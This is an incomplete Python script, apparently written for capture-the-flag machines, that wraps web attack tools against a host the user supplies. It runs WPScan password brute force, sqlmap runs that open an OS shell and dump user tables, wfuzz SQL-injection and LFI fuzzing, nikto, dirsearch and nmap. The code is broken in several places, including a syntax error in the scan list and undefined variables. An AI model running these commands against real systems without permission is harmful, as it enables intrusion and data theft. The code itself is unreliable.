#!/usr/bin/python3
import os


def TFwebenum():
	print("Welcome to TireFire WebEnum!")
	global portlist	
	portlist	= []
	while True:
		port 	= input("""
What is the port of the machine that we will be enumerating?
Example Syntax: 8000
> """)
		portlist.append(port)
		tfweq1	= input("Would you like to add another port?\n> ")
		if tfweq1.lower() in yes:
			continue
		else:
			break
	while True:
		try:
			tfweq1	= input("""
What scans would you like to conduct?



BruteForce		=	3
SquidsSqlFinder		=	4 
Nikto			=	5
Dirsearch 		=	6
NmapWebScan		=	7
> """)	
			try:
				tfweq1 = int(tfweq1)
			except ValueError:
				return
			scans	=	[ , "webappscan()", "sqlmap()", "wfuzz()", "squidssqlfinder()", "nikto()", "dirsearch()", "nmapwebscan()"]
			if tfweq1 > len(scans) - 1:
				continue
			eval(scans[tfweq1])
		except KeyboardInterrupt:
			print("\nLater tater")
			quit()


def webappscan():
	webapp	= input("""
Now what advanced webapp scan would you like to run?
WPscan			= 	1
Drupwn			=	2
Joomlavs		=	3
Joomblah		=	4
> """)
	ipp	= input("Where is the webapp located?\nExample Syntax	192.168.11.137:8000/wordpress\n> ")
	if webapp == "1":
		command = "wpscan --url http://{} --enumerate u,ap,tt,t,vp --passwords /usr/share/wordlists/rockyou.txt -e | tee 'wpscan_{}'".format(ipp, ipp)
	elif webapp == "2":
		command		= "drupwn enum http://{} | tee 'drupwn_{}'".format(ipp, ipp) 
	elif webapp == "3":
		command		= "ruby joomlavs.rb -u http://{} --scan-all | tee 'joomlahvs_{}'".format(ipp, ipp)
	elif webapp == "4":
		command		= "python joomblah.py http://{} | tee 'joomblah_{}'".format(ipp, ipp)
	webapplist = ("1", "2", "3", "4")
	if webapp not in webapplist:
		return
	doit(command)
	return

def sqlmap():
	sq1	= input("What is the location you would like to scan against?\nExample Syntax	192.168.11.137:8000/?nid=2\n> ")
	while True:
		sq2	= input("""
What are you trying to do?
Step 1. Quick General Enumeration	=	1
Step 2.	Try to get a sql SHELL 		=	2 <you need a database name for this to work which you may get from step 1>
Step 3. Try to dump tables		=	3
Step 4. Try to dump users		=	4
Step 5.	Use burp to Brute Force		=	5
> """)
		try:
			sq2 = int(sq2)
			break
		except TypeError:
			print("That was not a valid input. Go Fuck Yourself and Try Again.")
			return
		except ValueError:
			return
	if sq2	== 1:
		command		= 'sqlmap -u "{}" --risk=3 --level=5 --dbs --dump'.format(sq1)
	elif sq2	== 2:
		sq3	=	input("What is the name of the database you would like to make a shell from?\n> ")
		command = 'sqlmap -u “{}” --risk=3 --level=5 --os-shell -D {}'.format(sq1, sq3)
	elif sq2	== 3:
		command = 'sqlmap -u "{}" --risk=3 --level=5 --threads=4 --dbs --tables --batch'.format(sq1)
	elif sq2	== 4:
		command = 'sqlmap -u "{}" --risk=3 --level=5 --threads=4 --dbs  --batch -T users --dump'.format(sq1)
	elif sq2	== 5:
		sq4	= input("""
This one has a few extra steps, but it's pretty neat.
catch a POST to login page (or whatever) with burp
Send that to repeater, and copy the text out (by highlighting it)
put that text into a .txt file named post.txt
Make sure to note what the sql-injectable element is

What is the sql-injectable element? (uname, pword, username, etc...)\n> """)
		while True:
			sq5	= input("What is the full path to the post.txt file? (/root/Desktop/Machines/yee/post.txt)\n> ")
			if os.path.isfile(sq5) == True:
				break
			else:
				print("I can't seem to find that file...Try again.")
				continue
		command = 'sqlmap -r {} -p {}'.format(sq5, sq4)
	else:
		return
	doit(command)
	return

def wfuzz():
	q1 = input("""
Would you like to WFUZZ?
The Input to a page?	1
A URL 			2
> """)
	try:
		q1 = int(wq1)
	except TypeError:
		print("That was not a valid input. Go Fuck Yourself and Try Again.")
		return
	except ValueError:
		return
	if q1 == 1:
		q2 = input("""
What is the location you would like to scan against?
Example syntax http://192.168.11.8/checklogin.php
> """)
		q3 = input("""
What is the post request look like (catch in burp)?
NOTE: the FUZZ is important
Example syntax myusername=john&mypassword=FUZZ&Submit=Login
> """)
		input("If you do not want to follow the redirect, rerun and take out the -L.\n")
		command = "wfuzz -L -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d \"{}\"  {}".format(wq2, q2)
		doit(command)
		return
	elif q1 == 2:
		q2	= input("""
What is the location you would like to scan against?
NOTE: the FUZZ and FUZ2Z is important!
Example syntax http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z
> """)
		while True:
			q3	= input("""
Would you like to wfuzz a verb (v), a thing (t), or both (b)?
example http://192.168.11.130/yee.php?verb=thing
> """) 
			if q3 not in ["v", "t", "b"]:
				print("I am looking for a v, t, or b.")
				continue
			else:
				break
		if q3 == "v":
			command = 'wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u {}'.format(q2)
		elif q3 == "t":
			command = 'wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u {}'.format(q2)
		elif q3 == "b":
			command 	= 'wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u {}'.format(q2)
		doit(command)
		return

def squidssqlfinder():
	while True:
		ssfq1		= input("""
Where is the dirsearchsimple output you would like me to parse?
example: /root/Desktop/Machines/HTB/Jarvis/dirsearchsimple10.10.10.143:80
> """)
		if os.path.isfile(ssfq1) == True:
			print("File found!")
			break
		else:
			print("I can't seem to find that file...Try again.")
			continue
	path 		= ssfq1
	while True:
		if path[-1] != "/":
			path = path[:-1]
			continue
		else:
			break
	command 	= "bash SquidsSqlFinder.sh {} {}".format(ssfq1, path)
	doit(command)
	return

def nikto():
	print("What is the port of the machine that we will be enumerating?")
	number = 1
	for port in portlist:
		print("{}	{}:{}".format(number, ip, port))
		number += 1
	while True:
		try:
			port	= int(input("> "))
		except ValueError:
			print("Invalid input, you are being sent back to the WebEnum main page.")
			return
	port 	-= 1
	port	= portlist[port]
	command 	= "nikto -host http://{}:{} | tee 'nikto_{}-{}'".format(ip, port, ip, port)
	doit(command)
	return

def dirsearch():
	wdsq1	= input("Would you like this scan to be recursive?\n> ")
	rec = 0
	if wdsq1 in yes:
		rec = 1
	print("What is the port of the machine that we will be enumerating?")
	number = 1
	for port in portlist:
		print("{}	{}:{}".format(number, ip, port))
		number += 1
	while True:
		try:	
			port	= int(input("> "))
			break
		except ValueError:
			print("Invalid input, you are being sent back to the WebEnum main page.")	
			return
	port -= 1
	port = portlist[port]
	if rec == 0:
		command		= "python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u http://{}:{} --simple-report dirsearchsimple_{}-{}".format(ip, port, ip, port)
	elif rec == 1:
		command		= "python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -e php,exe,sh,py,html,pl -f -t 20 -u http://{}:{} -r -R 10 --simple-report dirsearchsimple_{}-{}".format(ip, port, ip, port)
	doit(command)
	return
def nmapwebscan():
	for port in portlist:
		command		= "nmap -vv --reason -Pn -sV -p {} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {}".format(port, ip)		
		doit(command)